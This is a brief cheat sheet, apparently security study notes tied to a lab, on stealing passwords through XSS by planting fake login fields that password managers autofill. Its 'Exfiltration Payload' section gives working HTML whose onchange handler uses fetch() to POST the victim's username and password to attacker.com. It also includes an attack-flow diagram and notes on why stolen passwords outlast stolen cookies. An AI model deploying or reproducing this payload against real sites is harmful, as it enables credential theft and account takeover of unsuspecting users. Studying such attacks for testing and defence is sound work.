# Password Exfiltration CheatSheet

## Goal

Capture victim credentials through XSS.

---

# Basic Concept

Create fake login fields.

Wait for:

```text
Password Manager Autofill
```

---

# Basic Payload

```html
<input
name="username"
id="username">

<input
type="password"
name="password">
```

---

# Exfiltration Payload

```html
<input
name="username"
id="username">

<input
type="password"

onchange="
fetch(
'https://attacker.com',
{
method:'POST',
body:
username.value+
':'+
this.value
}
)
">
```

---

# Attack Flow

```text
Victim Visits Page
        ↓
Password Autofill
        ↓
onchange
        ↓
Credentials Stolen
```

---

# Why Valuable

Cookies may fail due to:

```text
HttpOnly
Session Expiry
IP Binding
```

---

Passwords provide:

```text
Direct Login
Password Reuse
```

---

# Related Lab

```text
Lab27
```

---

# Bug Bounty Reminder

Credential theft is often considered:

```text
Critical Severity
```

because it frequently leads to complete account takeover.